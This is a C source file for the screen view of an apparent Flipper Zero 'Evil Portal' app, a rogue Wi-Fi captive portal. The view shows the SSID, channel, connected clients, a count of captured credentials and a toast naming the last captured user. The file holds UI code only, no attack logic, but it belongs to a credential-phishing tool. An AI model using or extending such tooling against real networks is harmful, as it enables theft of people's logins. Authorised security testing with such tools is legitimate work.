#include "evil_portal_view.h"
#include <furi.h>
#include <gui/elements.h>
#include <assets_icons.h>
#include <string.h>

// 2 second toast when fresh creds come in
#define TOAST_MS 2000
// hourglass cycles every 120ms
#define HOURGLASS_PERIOD_MS 120

typedef struct {
    char ssid[33];
    char last_user[32];
    char status[24];
    char busy_msg[24];
    uint32_t cred_count;
    uint16_t client_count;
    uint8_t channel;
    uint8_t hourglass_frame;
    bool busy;
    bool paused;
    uint32_t toast_until_ms;
} EvilPortalViewModel;

struct EvilPortalView {
    View* view;
    FuriTimer* timer;
    EvilPortalViewActionCb action_cb;
    void* action_ctx;
};

static const Icon* hourglass_icons[7] = {
    &I_hourglass0_24x24,
    &I_hourglass1_24x24,
    &I_hourglass2_24x24,
    &I_hourglass3_24x24,
    &I_hourglass4_24x24,
    &I_hourglass5_24x24,
    &I_hourglass6_24x24,
};

static uint32_t now_ms(void) {
    // FreeRTOS tick is 1 kHz on this port; good enough for toast timing.
    return (uint32_t)furi_get_tick();
}

static void evil_portal_view_timer_cb(void* ctx) {
    EvilPortalView* v = ctx;
    with_view_model(
        v->view,
        EvilPortalViewModel * m,
        {
            if(m->busy) {
                m->hourglass_frame = (m->hourglass_frame + 1) % 7;
            }
        },
        true);
}

static void evil_portal_view_draw(Canvas* canvas, void* model) {
    EvilPortalViewModel* m = model;
    canvas_clear(canvas);

    // ---- Header ----
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str_aligned(canvas, 64, 2, AlignCenter, AlignTop, "Evil Portal");
    canvas_draw_line(canvas, 0, 11, 127, 11);

    // ---- Left hero icon (or hourglass when busy) ----
    if(m->busy) {
        // Center 24x24 in the 62x31 area starting at (2, 14)
        canvas_draw_icon(canvas, 2 + (62 - 24) / 2, 14 + (31 - 24) / 2,
                         hourglass_icons[m->hourglass_frame % 7]);
    } else {
        canvas_draw_icon(canvas, 2, 14, &I_Connect_me_62x31);
    }

    // ---- Right data block ----
    canvas_set_font(canvas, FontSecondary);

    if(m->busy && m->busy_msg[0]) {
        // Replace the regular block with the busy message, centered vertically
        FuriString* s = furi_string_alloc_set(m->busy_msg);
        elements_string_fit_width(canvas, s, 58);
        canvas_draw_str(canvas, 67, 30, furi_string_get_cstr(s));
        furi_string_free(s);
    } else {
        // SSID label + value
        canvas_draw_str(canvas, 67, 19, "SSID:");
        FuriString* ssid = furi_string_alloc_set(m->ssid[0] ? m->ssid : "-");
        elements_string_fit_width(canvas, ssid, 58);
        canvas_draw_str(canvas, 67, 27, furi_string_get_cstr(ssid));
        furi_string_free(ssid);

        // Ch / Clients row
        char line[24];
        snprintf(line, sizeof(line), "Ch %u  Cli:%u", m->channel, m->client_count);
        canvas_draw_str(canvas, 67, 36, line);

        // Creds — invert when > 0 to draw the eye
        snprintf(line, sizeof(line), "Creds: %lu", (unsigned long)m->cred_count);
        if(m->cred_count > 0) {
            size_t w = canvas_string_width(canvas, line);
            canvas_draw_box(canvas, 65, 39, w + 4, 9);
            canvas_set_color(canvas, ColorWhite);
            canvas_draw_str(canvas, 67, 46, line);
            canvas_set_color(canvas, ColorBlack);
        } else {
            canvas_draw_str(canvas, 67, 46, line);
        }
    }

    // ---- Bottom strip: toast or status ----
    bool toast_active = (m->toast_until_ms != 0) && (m->toast_until_ms > now_ms()) &&
                        m->last_user[0];
    if(toast_active) {
        // Inverted toast bar 0..127, 50..60
        canvas_draw_box(canvas, 0, 50, 128, 10);
        canvas_set_color(canvas, ColorWhite);
        char buf[40];
        snprintf(buf, sizeof(buf), "Got: %s", m->last_user);
        FuriString* s = furi_string_alloc_set(buf);
        elements_string_fit_width(canvas, s, 124);
        canvas_draw_str(canvas, 2, 58, furi_string_get_cstr(s));
        furi_string_free(s);
        canvas_set_color(canvas, ColorBlack);
    } else if(!m->busy && m->status[0]) {
        // Subtle status under the data block
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 2, 58, m->status);
    }

    // ---- Buttons ----
    if(!toast_active) {
        elements_button_left(canvas, "Config");
        elements_button_center(canvas, m->paused ? "Resume" : "Pause");
    }
}

static bool evil_portal_view_input(InputEvent* event, void* context) {
    EvilPortalView* v = context;
    if(event->type != InputTypeShort) return false;
    if(event->key == InputKeyOk) {
        if(v->action_cb) v->action_cb(EvilPortalViewActionTogglePause, v->action_ctx);
        return true;
    }
    if(event->key == InputKeyLeft) {
        if(v->action_cb) v->action_cb(EvilPortalViewActionConfig, v->action_ctx);
        return true;
    }
    return false;
}

EvilPortalView* evil_portal_view_alloc(void) {
    EvilPortalView* v = malloc(sizeof(EvilPortalView));
    v->view = view_alloc();
    v->action_cb = NULL;
    v->action_ctx = NULL;
    view_set_context(v->view, v);
    view_allocate_model(v->view, ViewModelTypeLockFree, sizeof(EvilPortalViewModel));
    view_set_draw_callback(v->view, evil_portal_view_draw);
    view_set_input_callback(v->view, evil_portal_view_input);

    EvilPortalViewModel* m = view_get_model(v->view);
    m->ssid[0] = 0;
    m->last_user[0] = 0;
    strcpy(m->status, "Starting...");
    m->busy_msg[0] = 0;
    m->cred_count = 0;
    m->client_count = 0;
    m->channel = 0;
    m->hourglass_frame = 0;
    m->busy = false;
    m->paused = false;
    m->toast_until_ms = 0;
    view_commit_model(v->view, false);

    v->timer = furi_timer_alloc(evil_portal_view_timer_cb, FuriTimerTypePeriodic, v);
    furi_timer_start(v->timer, pdMS_TO_TICKS(HOURGLASS_PERIOD_MS));

    return v;
}

void evil_portal_view_free(EvilPortalView* v) {
    furi_assert(v);
    furi_timer_stop(v->timer);
    furi_timer_free(v->timer);
    view_free(v->view);
    free(v);
}

View* evil_portal_view_get_view(EvilPortalView* v) {
    return v->view;
}

void evil_portal_view_set_ssid(EvilPortalView* v, const char* ssid) {
    with_view_model(v->view, EvilPortalViewModel * m, {
        strncpy(m->ssid, ssid ? ssid : "", sizeof(m->ssid) - 1);
        m->ssid[sizeof(m->ssid) - 1] = 0;
    }, true);
}

void evil_portal_view_set_channel(EvilPortalView* v, uint8_t channel) {
    with_view_model(v->view, EvilPortalViewModel * m, { m->channel = channel; }, true);
}

void evil_portal_view_set_clients(EvilPortalView* v, uint16_t count) {
    with_view_model(v->view, EvilPortalViewModel * m, { m->client_count = count; }, true);
}

void evil_portal_view_set_creds(EvilPortalView* v, uint32_t count) {
    with_view_model(v->view, EvilPortalViewModel * m, { m->cred_count = count; }, true);
}

void evil_portal_view_set_last(EvilPortalView* v, const char* user) {
    with_view_model(v->view, EvilPortalViewModel * m, {
        strncpy(m->last_user, user ? user : "", sizeof(m->last_user) - 1);
        m->last_user[sizeof(m->last_user) - 1] = 0;
        if(m->last_user[0]) {
            m->toast_until_ms = now_ms() + TOAST_MS;
        }
    }, true);
}

void evil_portal_view_set_status(EvilPortalView* v, const char* status) {
    with_view_model(v->view, EvilPortalViewModel * m, {
        strncpy(m->status, status ? status : "", sizeof(m->status) - 1);
        m->status[sizeof(m->status) - 1] = 0;
    }, true);
}

void evil_portal_view_set_busy(EvilPortalView* v, bool busy, const char* msg) {
    with_view_model(v->view, EvilPortalViewModel * m, {
        m->busy = busy;
        if(busy) {
            strncpy(m->busy_msg, msg ? msg : "", sizeof(m->busy_msg) - 1);
            m->busy_msg[sizeof(m->busy_msg) - 1] = 0;
        } else {
            m->busy_msg[0] = 0;
        }
    }, true);
}

void evil_portal_view_set_paused(EvilPortalView* v, bool paused) {
    with_view_model(v->view, EvilPortalViewModel * m, { m->paused = paused; }, true);
}

void evil_portal_view_set_action_callback(
    EvilPortalView* v, EvilPortalViewActionCb cb, void* ctx) {
    v->action_cb = cb;
    v->action_ctx = ctx;
}
